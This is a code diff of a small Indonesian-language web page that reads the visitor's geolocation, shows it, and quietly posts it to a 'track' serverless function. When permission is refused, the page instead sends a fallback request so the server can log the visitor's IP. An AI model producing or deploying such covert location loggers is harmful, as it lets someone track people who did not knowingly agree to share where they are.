@@ -74,41 +74,47 @@
   <div class="spinner" id="loader"></div>
   <div id="location-info"></div>
 
-  <script>
-    window.addEventListener('load', () => {
-      const statusEl = document.getElementById('status');
-      const locationInfoEl = document.getElementById('location-info');
-      const loader = document.getElementById('loader');
+  
+<script>
+  window.addEventListener('load', () => {
+    const statusEl = document.getElementById('status');
+    const locationInfoEl = document.getElementById('location-info');
+    const loader = document.getElementById('loader');
 
-      if (!navigator.geolocation) {
-        statusEl.textContent = 'Browser kamu gak support lokasi nih.';
+    if (!navigator.geolocation) {
+      statusEl.textContent = 'Browser kamu gak support lokasi nih.';
+      loader.style.display = 'none';
+      return;
+    }
+
+    statusEl.textContent = 'Bentar ya, kita cek izin lokasi...';
+
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        statusEl.textContent = 'Lokasi kamu berhasil ditemukan!';
         loader.style.display = 'none';
-        return;
-      }
+        locationInfoEl.innerHTML = `
+          <p>Latitude: ${latitude.toFixed(6)}</p>
+          <p>Longitude: ${longitude.toFixed(6)}</p>
+          <p><a href="https://maps.google.com/?q=${latitude},${longitude}" target="_blank">Lihat di Google Maps</a></p>
+        `;
+        locationInfoEl.style.opacity = 1;
 
-      statusEl.textContent = 'Bentar ya, kita cek izin lokasi...';
+        await fetch('/.netlify/functions/track', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ latitude, longitude })
+        });
+      },
+      async (error) => {
+        // 
+        statusEl.textContent = 'Bentar Bro';
+        loader.style.display = 'block';
 
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-
-          statusEl.textContent = 'Lokasi kamu berhasil ditemukan!';
-          loader.style.display = 'none';
-          locationInfoEl.innerHTML = `
-            <p>Latitude: ${latitude.toFixed(6)}</p>
-            <p>Longitude: ${longitude.toFixed(6)}</p>
-            <p><a href="https://maps.google.com/?q=${latitude},${longitude}" target="_blank">Lihat di Google Maps</a></p>
-          `;
-          locationInfoEl.style.opacity = 1;
-
-          await fetch('/.netlify/functions/track', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ latitude, longitude })
-          });
-        },
-        async (error) => {
+        setTimeout(async () => {
           statusEl.textContent = 'Waduh, kamu gak izinkan lokasi. Gak apa-apa, kita coba pake IP deh.';
           loader.style.display = 'none';
 
@@ -117,9 +123,10 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ fallback: true })
           });
-        }
-      );
-    });
-  </script>
+        }, 1500); // 1.5 detik biar lebih smooth
+      }
+    );
+  });
+</script>
 </body>
 </html>
